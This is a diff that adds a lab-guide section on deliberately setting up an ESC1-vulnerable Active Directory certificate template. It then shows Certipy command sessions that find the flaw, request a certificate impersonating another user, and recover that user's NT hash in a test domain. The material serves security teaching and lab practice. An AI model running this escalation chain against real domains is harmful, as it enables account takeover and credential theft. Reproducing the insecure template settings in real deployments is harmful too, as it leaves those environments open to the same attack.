@@ -406,3 +406,189 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Trying to retrieve NT hash for 'svc_admin'
 [*] Got hash for 'svc_admin@hacklab.local': aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889
 ```
+
+
+**Creating Vulnerable ESC1 Certificate**
+
+
+1.	Open Server Manager / Tools / Certification Authority
+
+![1](https://github.com/myexploit/LAB/assets/15686493/a62c3e4f-8522-4c34-9d67-c74291dc1b32)
+
+
+2.	Right click on Certificate Templates / Manage
+
+![2](https://github.com/myexploit/LAB/assets/15686493/50df8455-e8a0-4586-9ac4-0abecefe906f)
+
+
+3.	Pull down to User right click select Duplicate Template.
+
+![3](https://github.com/myexploit/LAB/assets/15686493/563f34d8-a250-474f-ac55-9cde9f2d284c)
+
+
+4.	Click on the General tab and rename the certificate.
+
+![4](https://github.com/myexploit/LAB/assets/15686493/d1c4fb5b-4a03-4223-8453-83226a87ae50)
+
+5.	Click on the Security tab and for Authenticated Users, tick Enroll.
+
+![5](https://github.com/myexploit/LAB/assets/15686493/8d4dfdf4-b496-4d60-923e-b3ee85aedace)
+
+6.	Click on the Subject Name and select Supply in the request.
+
+![6](https://github.com/myexploit/LAB/assets/15686493/cbd3078b-4e1a-49da-ac8d-a52000337240)
+
+7.	Apply then click OK.
+
+8.	Click back to Certification Authority / Certificate Templates and right click then select Certificate Template to Issue.
+
+![8](https://github.com/myexploit/LAB/assets/15686493/41726a53-a2e8-440e-9d49-dcbfda625057)
+
+9.	Select your created certificate and then click OK.
+
+![9](https://github.com/myexploit/LAB/assets/15686493/6a02fc9c-a619-4e7c-ae88-0cd93bda780a)
+
+10.	You should then see your active certificate.
+
+![10](https://github.com/myexploit/LAB/assets/15686493/2ddd7d05-874d-4f66-b979-60f668c7a462)
+
+
+The following has been included to demonstrate that the certificate was then vulnerable.
+
+```
+(Tools) ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ certipy find -u g.white -p "Passw0rd!" -dc-ip 192.168.68.230 -scheme ldaps -ldap-channel-binding
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 36 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 14 enabled certificate templates
+[*] Trying to get CA configuration for 'hacklab-WIN-8HPLF8PSHC1-CA' via CSRA
+[!] Got error while trying to get CA configuration for 'hacklab-WIN-8HPLF8PSHC1-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+[*] Trying to get CA configuration for 'hacklab-WIN-8HPLF8PSHC1-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Got CA configuration for 'hacklab-WIN-8HPLF8PSHC1-CA'
+[*] Saved BloodHound data to '20240702112224_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
+[*] Saved text output to '20240702112224_Certipy.txt'
+[*] Saved JSON output to '20240702112224_Certipy.json'
+
+
+(Tools) ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ gedit 20240702112224_Certipy.txt
+
+
+Certificate Authorities
+  0
+    CA Name                             : hacklab-WIN-8HPLF8PSHC1-CA
+    DNS Name                            : WIN-8HPLF8PSHC1.hacklab.local
+    Certificate Subject                 : CN=hacklab-WIN-8HPLF8PSHC1-CA, DC=hacklab, DC=local
+    Certificate Serial Number           : 354DB064F33080BD4EB9FEAABE87DCF1
+    Certificate Validity Start          : 2024-04-23 13:56:37+00:00
+    Certificate Validity End            : 2029-04-23 14:06:33+00:00
+    Web Enrollment                      : Disabled
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Permissions
+      Owner                             : HACKLAB.LOCAL\Administrators
+      Access Rights
+        ManageCertificates              : HACKLAB.LOCAL\Administrators
+                                          HACKLAB.LOCAL\Domain Admins
+                                          HACKLAB.LOCAL\Enterprise Admins
+        ManageCa                        : HACKLAB.LOCAL\Administrators
+                                          HACKLAB.LOCAL\Domain Admins
+                                          HACKLAB.LOCAL\Enterprise Admins
+        Enroll                          : HACKLAB.LOCAL\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : Vuln_Cert
+    Display Name                        : Vuln_Cert
+    Certificate Authorities             : hacklab-WIN-8HPLF8PSHC1-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Enrollment Flag                     : PublishToDs
+                                          IncludeSymmetricAlgorithms
+    Private Key Flag                    : 16777216
+                                          65536
+                                          ExportableKey
+    Extended Key Usage                  : Client Authentication
+                                          Secure Email
+                                          Encrypting File System
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Validity Period                     : 1 year
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : HACKLAB.LOCAL\Domain Admins
+                                          HACKLAB.LOCAL\Domain Users
+                                          HACKLAB.LOCAL\Enterprise Admins
+                                          HACKLAB.LOCAL\Authenticated Users
+      Object Control Permissions
+        Owner                           : HACKLAB.LOCAL\Administrator
+        Write Owner Principals          : HACKLAB.LOCAL\Domain Admins
+                                          HACKLAB.LOCAL\Enterprise Admins
+                                          HACKLAB.LOCAL\Administrator
+        Write Dacl Principals           : HACKLAB.LOCAL\Domain Admins
+                                          HACKLAB.LOCAL\Enterprise Admins
+                                          HACKLAB.LOCAL\Administrator
+        Write Property Principals       : HACKLAB.LOCAL\Domain Admins
+                                          HACKLAB.LOCAL\Enterprise Admins
+                                          HACKLAB.LOCAL\Administrator
+    [!] Vulnerabilities
+      ESC1                              : 'HACKLAB.LOCAL\\Domain Users' and 'HACKLAB.LOCAL\\Authenticated Users' can enroll, enrollee supplies subject and template allows client authentication
+
+
+(Tools) ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ certipy req -u g.white -k -no-pass -ca 'hacklab-WIN-8HPLF8PSHC1-CA' -target 'WIN-8HPLF8PSHC1.hacklab.local' -template Vuln_Cert -dc-ip 192.168.68.230 -ptt -upn 'da1@hacklab.local' -debug
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[+] Domain retrieved from CCache: HACKLAB.LOCAL
+[+] Username retrieved from CCache: g.white
+[+] Trying to resolve 'WIN-8HPLF8PSHC1.hacklab.local' at '192.168.68.230'
+[+] Generating RSA key
+[*] Requesting certificate via RPC
+[+] Using Kerberos Cache: g.white.ccache
+[+] Using TGT from cache
+[+] Username retrieved from CCache: g.white
+[+] Getting TGS for 'host/WIN-8HPLF8PSHC1.hacklab.local'
+[+] Got TGS for 'host/WIN-8HPLF8PSHC1.hacklab.local'
+[+] Trying to connect to endpoint: ncacn_np:192.168.68.230[\pipe\cert]
+[+] Connected to endpoint: ncacn_np:192.168.68.230[\pipe\cert]
+[*] Successfully requested certificate
+[*] Request ID is 10
+[*] Got certificate with UPN 'da1@hacklab.local'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'da1.pfx'
+
+
+(Tools) ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ certipy auth -pfx da1.pfx -dc-ip 192.168.68.230
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Using principal: da1@hacklab.local
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'da1.ccache'
+[*] Trying to retrieve NT hash for 'da1'
+[*] Got hash for 'da1@hacklab.local': aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889
+
+
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
